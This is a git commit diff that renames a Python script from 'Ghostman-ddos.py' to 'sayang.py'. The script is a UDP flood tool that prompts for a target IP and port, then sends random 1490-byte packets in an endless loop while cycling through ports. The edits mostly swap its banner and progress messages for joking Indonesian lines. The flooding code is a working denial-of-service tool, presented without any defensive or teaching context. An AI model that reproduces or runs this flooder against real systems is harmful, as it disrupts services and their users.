1cde37cc789bb91f820c48d167652d9bfffee305
Ghostman <47413843+GH05TM4N@users.noreply.github.com>
2019-02-16 15:51:14 +0800

    Update and rename Ghostman-ddos.py to sayang.py

--- sayang.py
+++ sayang.py
@@ -12,10 +12,10 @@ day = now.day
 month = now.month
 year = now.year
 
-#######################################################
+##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-#######################################################
+#############
 
 os.system("clear")
 os.system("figlet DDos Attack")
@@ -28,23 +28,18 @@ print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
+
 os.system("clear")
-os.system("figlet Ghostman Attack")
-print "                        0% "
-time.sleep(3)
-print "===                     15%"
-time.sleep(3)
-print "=====                   25%"
-time.sleep(3)
-print "========                30%"
-time.sleep(3)
-print "============            45%"
-time.sleep(3)
-print "==============           50%"
+os.system("figlet Attack Starting")
+print "[Loading Sayang                               ] 0% "
 time.sleep(5)
-print "================        75%"
+print "[=====Sabar yah sayang :v                     ] 25%"
 time.sleep(5)
-print "========================100%"
+print "[==========Hampir masuk sayang		        ] 50%"
+time.sleep(5)
+print "[===============Udah masuk sayang             ] 75%"
+time.sleep(5)
+print "[==================Selamat Menikmati sayang :v] 100%"
 time.sleep(3)
 sent = 0
 while True:
@@ -53,4 +48,4 @@ while True:
      port = port + 1
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
-     port = 1
+       port = 1
